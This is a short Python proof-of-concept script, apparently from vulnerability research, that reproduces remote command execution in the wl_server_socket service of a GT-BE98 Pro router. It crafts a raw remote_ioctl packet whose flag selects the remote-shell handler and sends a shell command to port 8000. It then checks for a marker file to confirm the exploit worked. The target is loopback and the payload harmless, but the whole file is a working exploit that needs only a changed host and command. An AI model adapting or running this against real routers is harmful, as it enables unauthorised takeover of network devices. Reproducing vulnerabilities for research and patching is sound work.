#!/usr/bin/env python3
"""Loopback-only GT-BE98 Pro wl_server_socket command-path verifier."""

from __future__ import annotations

import socket
import struct
from pathlib import Path


HOST = "127.0.0.1"
PORT = 8000
MARKER = Path("/tmp/friday-gtbe98-component-rce")


def receive_exact(client: socket.socket, length: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < length:
        chunk = client.recv(length - len(chunks))
        if not chunk:
            break
        chunks.extend(chunk)
    return bytes(chunks)


def main() -> int:
    MARKER.unlink(missing_ok=True)
    command = b"echo FRIDAY_GTBE98_COMPONENT_RCE > /tmp/friday-gtbe98-component-rce\0"
    # remote_ioctl header: cmd, msg_len, flags, status, data_len, and four
    # interface/reserved words. Flag 0x8 selects the remote-shell handler.
    header = struct.pack("<9I", 0, len(command), 0x8, 0, len(command), 0, 0, 0, 0)
    with socket.create_connection((HOST, PORT), timeout=3) as client:
        client.sendall(header + command)
        response_header = receive_exact(client, 36)
        if len(response_header) == 36:
            fields = struct.unpack("<9I", response_header)
            response = receive_exact(client, fields[1])
            print(f"response_status={fields[3]} response={response!r}")
    reproduced = MARKER.read_text(errors="replace").strip() if MARKER.exists() else ""
    print(f"component_rce_reproduced={reproduced == 'FRIDAY_GTBE98_COMPONENT_RCE'}")
    return 0 if reproduced == "FRIDAY_GTBE98_COMPONENT_RCE" else 1


if __name__ == "__main__":
    raise SystemExit(main())
